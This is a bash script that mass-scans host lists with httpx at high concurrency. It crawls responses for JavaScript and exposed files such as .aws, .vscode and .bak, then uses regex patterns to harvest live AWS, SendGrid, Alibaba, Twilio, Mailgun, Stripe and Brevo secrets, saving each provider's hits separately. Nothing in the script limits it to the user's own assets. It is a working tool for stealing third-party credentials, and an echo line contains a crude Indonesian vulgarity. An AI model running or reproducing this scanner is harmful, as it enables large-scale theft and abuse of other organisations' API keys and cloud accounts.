#!/bin/bash

httpx=$HOME/go/bin/httpx

process_file() {
    local input_file="$1"
    local total=$(cat "$input_file" | wc -l)
    local a=0
    local b=$(echo $RANDOM | md5sum | head -c 12)

    echo "total list $total mengentot $input_file"

    local dir_name="dir$b"
    mkdir "$dir_name"
    split -l 500 "$input_file" "$dir_name/$b"
    
    local list_file="list.$b"
    ls "$dir_name" | grep $b >"$list_file"

    for lsline in $(cat "$list_file"); do
        local b2=$(echo $RANDOM | md5sum | head -c 12)
        local output_file="1"
        httpx -silent -sr -srd $b2 -t 300 -l "$dir_name/$lsline" >"$output_file"
        grep -r -Eo "/[a-zA-Z0-9./?=_-]*\.(js|.DS_Store|.vscode|.aws|.bak|.sol|.csv|.cfg|.dat|.yml)" $b2/ | sed "s/$b2\///" | sed "s/\.txt\://" | sed 's/\[slash\]/\//g' >>"url.$b2" 
        rm -r $b2

        a=$((a+500))
        httpx -silent -l "url.$b2" -t 300 -mr "AKIA[A-Z0-9]{16}" >"aws.$b2"
        httpx -silent -sr -srd AKIA -l "aws.$b2"

        httpx -silent -l "url.$b2" -t 300 -mr "SG\.[0-9A-Za-z-_]{22}\.[0-9A-Za-z-_]{43}" >"sendgrid.$b2"
        httpx -silent -sr -srd SG -l "sendgrid.$b2"

        httpx -silent -l "url.$b2" -t 300 -mr "email-smtp\.(us|eu|ap|ca|cn|sa)-(central|(north|south)?(west|east)?)-[0-9]{1}\.amazonaws.com" >"smtp.$b2"
        httpx -silent -sr -srd SMTP -l "smtp.$b2"

        httpx -silent -l "url.$b2" -t 300 -mr "(?i)\b((LTAI)(?i)[a-z0-9]{20})(?:['|\"|\n|\r|\s|\x60]|$)" >"alibaba.$b2"
        httpx -silent -sr -srd LTAI -l "alibaba.$b2"
        
        httpx -silent -l url.$b2 -t 300 -mr "AC[a-f0-9]{32}" >"twilio.$b2"
        httpx -silent -sr -srd TWILIO -l "twilio.$b2"

        httpx -silent -l url.$b2 -t 300 -mr "key-[0-9a-zA-Z]{32}" > mailgun.$b2
        httpx -silent -sr -srd MAILGUN -l "mailgun.$b2"

        httpx -silent -l url.$b2 -t 300 -mr "sk_live_[0-9A-Za-z]{24,99}" > sklive.$b2
        httpx -silent -sr -srd SKLIVE -l "sklive.$b2"

        httpx -silent -l url.$b2 -t 300 -mr "xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}" > brevo.$b2
        httpx -silent -sr -srd BREVO -l "brevo.$b2"


        echo "Finish $lsline total [$a]"
        rm "url.$b2"
        rm "aws.$b2"
        rm "sendgrid.$b2"
        rm "alibaba.$b2"
        rm "smtp.$b2"
        rm "twilio.$b2"
        rm "mailgun.$b2"
        rm "sklive.$b2"
        rm "brevo.$b2"
        

    done

    rm "$list_file"
    rm -r "$dir_name"
}

# Checking for the -s option
if [[ "$1" == "-s" && "$2" =~ ^[0-9]+$ ]]; then
    segments="$2"
    input_file="$3"
    tmp_dir=$(mktemp -d)
    
    # Split the file into the desired number of segments
    split -n l/$segments "$input_file" "${tmp_dir}/segment_"

    # Export the function to the environment
    export -f process_file

    # Use parallel to process each segment
    parallel --ungroup -j $segments process_file {} ::: ${tmp_dir}/*

    # Cleanup
    rm -r "${tmp_dir}"
else
    process_file "$1"
fi
